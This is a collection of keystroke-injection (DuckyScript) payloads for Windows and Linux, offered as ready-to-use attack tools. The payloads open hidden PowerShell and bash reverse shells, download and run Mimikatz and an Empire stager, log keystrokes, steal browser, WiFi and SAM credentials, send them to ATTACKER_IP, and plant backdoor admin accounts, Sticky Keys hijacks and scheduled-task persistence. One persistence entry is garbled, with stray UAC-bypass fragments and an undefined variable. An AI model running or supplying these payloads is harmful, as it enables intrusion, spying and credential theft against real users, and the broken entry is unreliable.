name: Windows Meterpreter Reverse Shell
description: Opens PowerShell and downloads/executes a Meterpreter reverse shell payload from attacker server
code:
REM Windows Meterpreter Reverse Shell
REM Author: Educational Demo
REM Target: Windows 10/11
REM ATTACKER_IP and ATTACKER_PORT must be configured

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass
ENTER
DELAY 1000
STRING $c = New-Object Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT)
ENTER
STRING $s = $c.GetStream();[byte[]]$b = 0..65535|%{0}
ENTER
STRING while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
ENTER
STRING $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
ENTER
STRING $r = (iex $d 2>&1 | Out-String)
ENTER
STRING $sb = ([text.encoding]::ASCII).GetBytes($r)
ENTER
STRING $s.Write($sb,0,$sb.Length);$s.Flush()}
ENTER
STRING $c.Close()
ENTER

name: LSASS Credential Dump (Mimikatz)
description: Downloads Mimikatz and dumps LSASS credentials including NTLM hashes and Kerberos tickets
code:
REM LSASS Credential Dump via Mimikatz
REM Requires: Admin privileges
REM Target: Windows 10/11

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden Start-Process powershell -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000
STRING Set-ExecutionPolicy Bypass -Force
ENTER
DELAY 300
STRING IEX (New-Object Net.WebClient).DownloadString('https://ATTACKER_IP/Invoke-Mimikatz.ps1')
ENTER
DELAY 500
STRING Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' | Out-File C:\Windows\Temp\creds.txt
ENTER
DELAY 500
STRING Invoke-WebRequest -Uri https://ATTACKER_IP/upload -Method POST -InFile C:\Windows\Temp\creds.txt
ENTER
STRING Remove-Item C:\Windows\Temp\creds.txt -Force
ENTER

name: Empire Stager
description: Downloads and executes a PowerShell Empire stager for post-exploitation C2 communication
code:
REM PowerShell Empire Stager
REM Requires: Empire server running
REM Target: Windows 10/11

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass
ENTER
DELAY 1000
STRING $wc = New-Object System.Net.WebClient
ENTER
STRING $wc.Headers.Add('User-Agent','Mozilla/5.0')
ENTER
STRING $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
ENTER
STRING $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
ENTER
STRING $data = $wc.DownloadString('https://EMPIRE_SERVER/stager')
ENTER
STRING IEX $data
ENTER

ENTER

name: Screenshot Grabber
description: Captures screenshots of all monitors and exfiltrates via HTTP POST to attacker server
code:
REM Screenshot Grabber
REM Captures all displays and exfiltrates
REM Target: Windows 10/11

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass
ENTER
DELAY 1000
STRING Add-Type -AssemblyName System.Windows.Forms
ENTER
STRING Add-Type -AssemblyName System.Drawing
ENTER
STRING $screens = [System.Windows.Forms.Screen]::AllScreens
ENTER
STRING $top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
ENTER
STRING $left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
ENTER
STRING $width = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum
ENTER
STRING $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
ENTER
STRING $bitmap = New-Object System.Drawing.Bitmap($width-$left, $height-$top)
ENTER
STRING $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
ENTER
STRING $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
ENTER
STRING $path = "$env:TEMP\ss_$(Get-Date -f yyyyMMdd_HHmmss).png"
ENTER
STRING $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
ENTER
STRING Invoke-WebRequest -Uri https://ATTACKER_IP/upload -Method POST -InFile $path
ENTER
STRING Remove-Item $path -Force
ENTER

name: Keylogger Install
description: Installs a PowerShell-based keylogger that captures keystrokes and periodically exfiltrates logs
code:
REM PowerShell Keylogger Installer
REM Captures keystrokes to log file
REM Target: Windows 10/11

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass
ENTER
DELAY 1000
STRING $code = @'
ENTER
STRING $API = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);' -Name WinAPI -PassThru
ENTER
STRING $logPath = "$env:TEMP\keylog.txt"
ENTER
STRING while($true) {
ENTER
STRING   Start-Sleep -Milliseconds 50
ENTER
STRING   for($k = 8; $k -le 190; $k++) {
ENTER
STRING     if($API::GetAsyncKeyState($k) -eq -32767) {
ENTER
STRING       $char = [char]$k
ENTER
STRING       Add-Content $logPath $char
ENTER
STRING     }
ENTER
STRING   }
ENTER
STRING }
ENTER
STRING '@
ENTER
STRING $code | Out-File $env:TEMP\kl.ps1
ENTER
STRING Start-Process powershell -WindowStyle Hidden -ArgumentList '-ep bypass -f $env:TEMP\kl.ps1'
ENTER

name: Persistence (Startup Folder)
description: Creates a VBS script in the Startup folder that re-establishes reverse shell on every login
code:
REM Persistence via Startup Folder
REM Drops reverse shell script to auto-start
REM Target: Windows 10/11

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass
ENTER
DELAY 1000
STRING $startup = [Environment]::GetFolderPath('Startup')
ENTER
STRING $payload = 'CreateObject("WScript.Shell").Run "powershell -w hidden -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(''https://ATTACKER_IP/payload.ps1'')\""'
ENTER
STRING $payload | Out-File "$startup\WindowsUpdate.vbs" -Encoding ASCII
ENTER
STRING Write-Host '[+] Persistence installed at:' $startup
ENTER

ENTER

ENTER
STRING New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force
ENTER
STRING Start-Process fodhelper.exe
ENTER
DELAY 3000

ENTER

ENTER

ENTER

ENTER

ENTER

ENTER

ENTER
STRING Invoke-WebRequest -Uri https://ATTACKER_IP/upload -Method POST -InFile $out

STRING Remove-Item $out -Force
ENTER

name: Browser Password Stealer
description: Extracts saved passwords from Chrome, Edge, and Firefox browsers using DPAPI decryption
code:
REM Browser Password Extractor
REM Extracts Chrome/Edge/Firefox saved passwords
REM Target: Windows 10/11

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass
ENTER
DELAY 1000
STRING Add-Type -AssemblyName System.Security
ENTER
STRING $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
ENTER
STRING $tempDb = "$env:TEMP\chrome_login.db"
ENTER
STRING Copy-Item $chromePath $tempDb -Force
ENTER
STRING $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
ENTER
STRING $conn.Open()
ENTER
STRING $cmd = $conn.CreateCommand()
ENTER
STRING $cmd.CommandText = 'SELECT origin_url, username_value, password_value FROM logins'
ENTER
STRING $reader = $cmd.ExecuteReader()
ENTER
STRING $results = @()
ENTER
STRING while($reader.Read()) {
ENTER
STRING   $url = $reader['origin_url']; $user = $reader['username_value']
ENTER
STRING   $encPass = $reader['password_value']
ENTER
STRING   $results += "$url | $user | [encrypted]"
ENTER
STRING }
ENTER
STRING $results | Out-File $env:TEMP\browser_creds.txt
ENTER
STRING Invoke-WebRequest -Uri https://ATTACKER_IP/upload -Method POST -InFile $env:TEMP\browser_creds.txt
ENTER
STRING Remove-Item $env:TEMP\browser_creds.txt, $tempDb -Force
ENTER

name: WiFi Password Dump
description: Extracts all saved WiFi profiles and their plaintext passwords using netsh commands
code:
REM WiFi Password Dumper
REM Extracts all saved WiFi passwords
REM Target: Windows 10/11

DELAY 1000
GUI r
DELAY 500
STRING cmd /k
ENTER
DELAY 800
STRING netsh wlan show profiles | findstr "Profile" > %TEMP%\wifi_profiles.txt
ENTER
DELAY 500
STRING echo ==== WIFI PASSWORDS ==== > %TEMP%\wifi_pass.txt
ENTER
STRING for /f "tokens=2 delims=:" %a in (%TEMP%\wifi_profiles.txt) do @netsh wlan show profile name=%a key=clear | findstr "Key Content" >> %TEMP%\wifi_pass.txt
ENTER
DELAY 2000
STRING powershell -w hidden Invoke-WebRequest -Uri https://ATTACKER_IP/upload -Method POST -InFile $env:TEMP\wifi_pass.txt
ENTER
STRING del %TEMP%\wifi_profiles.txt %TEMP%\wifi_pass.txt /q
ENTER
STRING exit
ENTER

name: SAM Database Dump
description: Dumps SAM and SYSTEM registry hives using reg save for offline NTLM hash extraction
code:
REM SAM Database Dump
REM Requires: Admin privileges
REM Target: Windows 10/11

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden Start-Process cmd -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000
STRING reg save HKLM\SAM %TEMP%\sam.save /y
ENTER
DELAY 500
STRING reg save HKLM\SYSTEM %TEMP%\system.save /y
ENTER
DELAY 500
STRING reg save HKLM\SECURITY %TEMP%\security.save /y
ENTER
DELAY 500
STRING powershell -w hidden -c "Compress-Archive -Path $env:TEMP\sam.save,$env:TEMP\system.save,$env:TEMP\security.save -DestinationPath $env:TEMP\hives.zip -Force"
ENTER
DELAY 1000
STRING powershell -w hidden Invoke-WebRequest -Uri https://ATTACKER_IP/upload -Method POST -InFile $env:TEMP\hives.zip
ENTER
STRING del %TEMP%\sam.save %TEMP%\system.save %TEMP%\security.save %TEMP%\hives.zip /q
ENTER
STRING exit
ENTER

name: RDP Enable + Password Set
description: Enables Remote Desktop, creates a hidden admin user, and configures firewall for RDP access
code:
REM Enable RDP + Create Backdoor User
REM Requires: Admin privileges
REM Target: Windows 10/11

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden Start-Process powershell -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000
REM Enable RDP
STRING Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0
ENTER
STRING Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'
ENTER
REM Create hidden admin user
STRING net user support_admin P@ssw0rd!2024 /add
ENTER
STRING net localgroup Administrators support_admin /add
ENTER
STRING net localgroup 'Remote Desktop Users' support_admin /add
ENTER
REM Hide from login screen
STRING New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'support_admin' -Value 0 -PropertyType DWord -Force
ENTER
STRING Write-Host '[+] RDP enabled, user created: support_admin / P@ssw0rd!2024'
ENTER

name: Sticky Keys Backdoor
description: Replaces sethc.exe (Sticky Keys) with cmd.exe to get SYSTEM shell at the login screen
code:
REM Sticky Keys Backdoor
REM Replaces sethc with cmd for login screen shell
REM Requires: Admin/SYSTEM

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden Start-Process cmd -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000
STRING takeown /f C:\Windows\System32\sethc.exe
ENTER
DELAY 500
STRING icacls C:\Windows\System32\sethc.exe /grant administrators:F
ENTER
DELAY 500
STRING copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
ENTER
STRING echo [+] Sticky Keys backdoor installed
ENTER
STRING echo [+] Press SHIFT 5x at login screen for SYSTEM cmd
ENTER
STRING exit
ENTER

name: BITS Job Persistence
description: Creates a BITS transfer job that survives reboots and periodically downloads/executes payload
code:
REM BITS Job Persistence
REM Survives reboots via BITS transfer
REM Target: Windows 10/11

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass
ENTER
DELAY 1000
STRING $job = Start-BitsTransfer -Source 'https://ATTACKER_IP/payload.exe' -Destination "$env:TEMP\update.exe" -Asynchronous
ENTER
STRING $job | Set-BitsTransfer -Priority High
ENTER
REM Create scheduled task to check BITS job
STRING $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -c "if(Test-Path $env:TEMP\update.exe){Start-Process $env:TEMP\update.exe -WindowStyle Hidden}"'
ENTER
STRING $trigger = New-ScheduledTaskTrigger -AtLogon
ENTER
STRING Register-ScheduledTask -TaskName 'WindowsUpdateService' -Action $action -Trigger $trigger -Force
ENTER
STRING Write-Host '[+] BITS persistence installed'
ENTER

name: Scheduled Task Backdoor
description: Creates a hidden scheduled task that executes reverse shell payload every 15 minutes
code:
REM Scheduled Task Backdoor
REM Runs payload every 15 minutes
REM Target: Windows 10/11

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass
ENTER
DELAY 1000
STRING $payload = 'powershell -w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''https://ATTACKER_IP/beacon.ps1'')"'
ENTER
STRING $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-w hidden -c $payload"
ENTER
STRING $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
ENTER
STRING $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
ENTER
STRING Register-ScheduledTask -TaskName 'MicrosoftEdgeUpdate' -Action $action -Trigger $trigger -Settings $settings -Force
ENTER
STRING Write-Host '[+] Scheduled task backdoor installed (every 15 min)'
ENTER

name: Linux Root Shell
description: Opens terminal on Linux and establishes a bash reverse shell with a Python PTY upgrade
code:
REM Linux Reverse Shell
REM Opens terminal and connects back
REM Target: Linux (Ubuntu/Debian)

DELAY 1000
CTRL ALT t
DELAY 1500
STRING bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1 &
ENTER
DELAY 500
STRING python3 -c 'import pty;pty.spawn("/bin/bash")' 2>/dev/null || python -c 'import pty;pty.spawn("/bin/bash")'
ENTER
DELAY 300
STRING export TERM=xterm
ENTER
STRING clear
ENTER
